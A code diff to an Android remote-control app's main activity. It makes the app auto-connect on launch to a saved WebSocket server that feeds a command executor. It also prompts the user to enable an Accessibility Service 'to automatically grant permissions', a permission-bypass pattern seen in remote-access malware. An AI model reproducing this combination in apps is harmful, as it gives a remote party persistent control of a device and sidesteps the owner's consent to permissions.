@@ -98,6 +98,13 @@ class MainActivity : AppCompatActivity() {
         connectWifiButton = findViewById(R.id.connectWifiButton)
         
         // Initialize CommandExecutor for WiFi
+        val prefs = getSharedPreferences("BTRemotePrefs", MODE_PRIVATE)
+        
+        // Check if Accessibility Service is enabled
+        if (!isAccessibilityServiceEnabled()) {
+            promptEnableAccessibilityService()
+        }
+        
         val wifiExecutor = CommandExecutor(this, useChunking = false) { response ->
             webSocketManager?.sendMessage(response)
         }
@@ -125,6 +132,16 @@ class MainActivity : AppCompatActivity() {
             }
         )
         
+        // Load saved server IP and auto-connect (AFTER WebSocketManager is initialized)
+        val savedIp = prefs.getString("server_ip", "")
+        if (!savedIp.isNullOrEmpty()) {
+            ipInput.setText(savedIp)
+            // Auto-connect on launch if IP is saved
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                connectToWifi(savedIp)
+            }, 500) // Small delay to ensure UI is ready
+        }
+        
         startButton.setOnClickListener {
             checkPermissionsAndStart()
         }
@@ -149,6 +166,11 @@ class MainActivity : AppCompatActivity() {
     
     private fun connectToWifi(ip: String) {
         updateStatus("Connecting to $ip...")
+        
+        // Save server IP for auto-connect
+        val prefs = getSharedPreferences("BTRemotePrefs", MODE_PRIVATE)
+        prefs.edit().putString("server_ip", ip).apply()
+        
         webSocketManager?.connect(ip)
     }
     
@@ -371,5 +393,36 @@ class MainActivity : AppCompatActivity() {
                 updateStatus("ERROR: Permissions required!")
             }
         }
+    }
+    
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        val accessibilityEnabled = android.provider.Settings.Secure.getInt(
+            contentResolver,
+            android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
+            0
+        )
+        
+        if (accessibilityEnabled == 1) {
+            val services = android.provider.Settings.Secure.getString(
+                contentResolver,
+                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            )
+            return services?.contains(packageName) == true
+        }
+        
+        return false
+    }
+    
+    private fun promptEnableAccessibilityService() {
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(this)
+            .setTitle("Enable Auto-Permission")
+            .setMessage("To automatically grant permissions, please enable the BTRemote Accessibility Service in Settings.\n\nThis is required for automatic permission granting.")
+            .setPositiveButton("Open Settings") { _, _ ->
+                val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                startActivity(intent)
+            }
+            .setNegativeButton("Skip", null)
+            .create()
+        dialog.show()
     }
 }
